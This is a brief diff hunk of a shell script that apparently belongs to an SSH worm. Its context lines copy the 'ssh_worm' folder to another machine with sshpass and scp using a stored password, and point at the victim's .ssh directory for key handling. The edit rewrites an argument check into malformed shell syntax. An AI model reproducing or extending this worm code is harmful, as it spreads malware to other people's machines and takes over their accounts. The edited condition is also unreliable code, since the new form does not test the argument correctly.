@@ -9,7 +9,7 @@ sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victi
 # publickey
 SSH_PATH="/home/victim/.ssh"
 
-if [ "$1" == "y" ]
+if [ {$1} = "y" ]
 then
 	(
 	echo "\r"
